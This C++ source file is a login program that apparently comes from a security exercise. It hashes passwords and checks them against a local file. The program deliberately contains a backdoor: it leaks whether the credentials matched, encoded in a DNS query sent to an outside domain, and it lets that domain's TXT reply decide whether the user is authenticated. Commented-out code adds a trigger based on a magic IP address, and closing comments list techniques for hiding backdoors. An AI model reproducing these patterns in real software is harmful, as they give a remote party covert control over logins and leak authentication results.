#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <unordered_map>
#include <iomanip> 
#include <netdb.h>
#include <arpa/inet.h>
#include <cstdlib>
#include "authlib.h"
#include "openssl/sha.h" 

#define DNS_SERVER "8.8.8.8" // Google Server for DNS processing
#define DNS_PORT 53
#define DOMAIN "apitxt.authservice.co.uk" // domain for CAPTCHA
#define END ;

using string = std::string END

std::string sha256(const std::string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(reinterpret_cast<const unsigned char*>(input.c_str()), input.length(), hash);
    
    char outputBuffer[65]; // 64 characters for SHA-256 + null terminator
    for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i) {
        sprintf(outputBuffer + (i * 2), "%02x", hash[i]);
    }
    outputBuffer[64] = '\0'; // Null terminator
    return std::string(outputBuffer);
}

std::string createDnsRequest(const std::string& domain, bool userCondition) {
    unsigned char buf[512] = {0};
    int offset = 0;

    // Assign Transaction ID, encoding the condition as part of the ID
    buf[0] = 0x12; // Arbitrary high byte
    buf[1] = userCondition ? 0x34 : 0x35; // 0x34 for true, 0x35 for false
    //std::cout << buf[1];

    // Building DNS Query Header
    buf[2] = 0x01; // Standard query with recursion desired
    buf[5] = 0x01; // One question

    offset = 12; // Header is 12 bytes

    std::string currentDomain = domain + ".";
    for (size_t i = 0; i < currentDomain.size(); ++i) {
        size_t dotPos = currentDomain.find('.', i);
        if (dotPos == std::string::npos) dotPos = currentDomain.size();
        buf[offset++] = dotPos - i; // Length of each label
        memcpy(buf + offset, currentDomain.c_str() + i, dotPos - i);
        offset += dotPos - i;
        i = dotPos;
    }

    buf[offset++] = 0; // Null terminator for domain name
    buf[offset++] = 0x00; buf[offset++] = 0x10; // Type: TXT (0x0010)
    buf[offset++] = 0x00; buf[offset++] = 0x01; // Class: IN

    std::cout << std::string(reinterpret_cast<char*>(buf), offset);
    return std::string(reinterpret_cast<char*>(buf), offset);
}

bool handleDnsResponse(const char* buffer, int length) {
    if (length < 12) {
        std::cerr << "Received a response that's too short." << std::endl;
        return false;
    }

    // Check for DNS response errors
    if ((buffer[3] & 0x0F) != 0) {
        std::cerr << "DNS error in response code: " << (buffer[3] & 0x0F) << std::endl;
        return false;
    }

    int pos = 12; // Start past the DNS header

    // Skip the question section
    while (buffer[pos] != 0) {
        pos++;
    }
    pos += 5; // Skip null byte, QTYPE, and QCLASS

    // Begin reading answer section
    while (pos < length) {
        pos += 2; // Skip NAME

        unsigned short type = (buffer[pos] << 8) | buffer[pos + 1];
        pos += 2;

        pos += 2; // Skip CLASS
        pos += 4; // Skip TTL

        unsigned short rdLength = (buffer[pos] << 8) | buffer[pos + 1];
        pos += 2;

        if (type == 0x0010 && pos + rdLength <= length) { // Check for TXT record
            int txtLength = buffer[pos];
            std::string txtRecord(buffer + pos + 1, txtLength);

            //std::cout << "Received TXT Record: " << txtRecord << std::endl;

            if (txtRecord == "failed") {
                std::cout << "Credentials are incorrect!";
                //std::cerr << "Query handling failed according to received response." << std::endl;
                return false;
            }

            // Handle CAPTCHA: Assume the record is formatted as "question|hash"
            size_t delimPos = txtRecord.find('|');
            if (delimPos != std::string::npos) {
                std::cout << txtRecord;
                std::string question = txtRecord.substr(0, delimPos);
                std::string receivedHash = txtRecord.substr(delimPos + 1);

                std::cout << "CAPTCHA Question: " << question << std::endl;
                std::cout << "CAPTCHA Answer: ";
                std::string captcha_ans;
                std::cin >> captcha_ans;

                std::string captcha_ans_hashed = sha256(captcha_ans);

                if(captcha_ans_hashed == receivedHash) {
                    std::cout << "Captcha solved correctly";
                    return true;
                }
                else {
                    return false;
                }
            }

            pos += rdLength; // Move to the next record
        } else {
            pos += rdLength; // Move to the next record
        }
    }

    return true;
}

/* Can be deleted
bool  DNSQuery() { //rename to auth_request
    //std::cerr << "DEBUG: check_trigger() called" << std::endl;

    // Get the domain from an environment variable
    const char* domain = DOMAIN END
    if (domain == nullptr) {
        return false; // Environment variable not set
    }

    // Query DNS for the domain
    struct hostent* host_info = gethostbyname(domain) END
    if (host_info == nullptr) {
        return false; // DNS query failed
    }

    // Convert to IP string
    struct in_addr** addr_list = (struct in_addr**)host_info->h_addr_list END
    std::string ip = inet_ntoa(*addr_list[0]) END

   //#ifdef DEBUG
   // std::cout << "DNS response for domain: " << domain << " is IP: " << ip << std::endl END
    //#endif 
   // std::cerr << "DEBUG: DNS response for domain: " << domain << " is IP: " << ip << std::endl;
    
    // Check if IP is returned
    return (ip == "1.8.1.0") END
}*/

/* not called can be deleted
bool verifyCaptcha(const std::string& receivedHash, const std::string& userInput) {
    std::string hashedInput = sha256(userInput);
    return (hashedInput == receivedHash);
}*/
/* Can be deleted
std::string createDnsRequest(const std::string& domain) {
    unsigned char buf[512] = {0};
    int offset = 12;

    // DNS-Anfrage aufbauen
    std::string currentDomain = domain + ".";
    for (size_t i = 0; i < currentDomain.size(); ++i) {
        size_t dotPos = currentDomain.find('.', i);
        if (dotPos == std::string::npos) dotPos = currentDomain.size();
        buf[offset++] = dotPos - i; // Länge des Tokens
        memcpy(buf + offset, currentDomain.c_str() + i, dotPos - i);
        offset += dotPos - i;
        i = dotPos;
    }

    buf[offset++] = 0; // Null-Terminierung
    buf[offset++] = 0x00; buf[offset++] = 0x01; // Typ: A
    buf[offset++] = 0x00; buf[offset++] = 0x01; // Klasse: IN

    return std::string(reinterpret_cast<char*>(buf), offset);
}*/

int main() {
    
    //mapping to store username (key) & hashed password (value)
    std::unordered_map<string, string> user_passwords END 
    string line END
    string username END 
    string hashed_pass END 
    string password END
    bool userCondition END

    //opening password file
    std::ifstream password_file("passwords.txt") END

    //add below or not depending on how many ':' and ';' we have in our code
    //if (!password_file.is_open()) {
    //    std::cerr << "Error opening password file." << std::endl;
    //    return 1; 

    //reading each line & parsing username & hashed password
    while (std::getline(password_file, line)) {
        size_t separator = line.find(':') END    //finding position of ':'

        if (separator != string::npos) {
            username = line.substr(0, separator) END   //extracting username
            hashed_pass = line.substr(separator + 1) END //extracting hashed password
            user_passwords[username] = hashed_pass END   //storing in map
        }
    }
    password_file.close() END  

    //prompting user for username
    std::cout << "Enter username: " END
    std::cin >> username END

    //prompting user for password
    std::cout << "Enter password: " END
    std::cin >> password END

    //hash the entered password using SHA256
    string user_input_hash = sha256(password) END
    /*
    //checking for username and hashed input matches store 
    if (user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash || DNSQuery()) {
        authenticated(username) END  //call authenticated if credentials are correct or DNSQuery gives correct IP
    }
    else {
    // choose how to handle invalid logins here or leave this open for backdoor logic
        std::cerr << "Invalid login credentials." << std::endl END
    }*/

    if (user_passwords.find(username) != user_passwords.end() && user_passwords[username] == user_input_hash) {
        userCondition = true END  //call authenticated if credentials are correct or DNSQuery gives correct IP
    }
    else {
    // choose how to handle invalid logins here or leave this open for backdoor logic
        userCondition = false END
    } 

    //bool userCondition = true; // The boolean we're encoding into the query

    std::string dnsRequest = createDnsRequest(DOMAIN, userCondition);

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, DNS_SERVER, &serverAddr.sin_addr);

    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        std::cerr << "Socket creation failed!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "test" << dnsRequest.c_str();
    sendto(sock, dnsRequest.c_str(), dnsRequest.size(), 0, 
           (struct sockaddr*)&serverAddr, sizeof(serverAddr));

    char buffer[512];
    socklen_t addrlen = sizeof(serverAddr);
    int n = recvfrom(sock, buffer, sizeof(buffer), 0, (struct sockaddr*)&serverAddr, &addrlen);
    if (n < 0) {
        std::cerr << "Failed to receive response!" << std::endl;
        shutdown(sock, SHUT_RDWR);
        return EXIT_FAILURE;
    }

    std::cout << "Received response" << std::endl;

    if (!handleDnsResponse(buffer, n)) {
        rejected(username);
        //std::cerr << "Failed to process the DNS response." << std::endl;
        //shutdown(sock, SHUT_RDWR);
        //return EXIT_FAILURE;
    }
    else {
        authenticated(username);
    }

    shutdown(sock, SHUT_RDWR);
    return 0;

    return 0 END
}




//possible ideas 

//unrelated checks to trigger a backdoor
//spread backdoor code across many functions
//each back of backdoor can be explained to look like normal logic
//use of encrypted or hard-to-interpert values to trigger backdoors, so even if someone finds code they wont understand how it works without correct decryption or key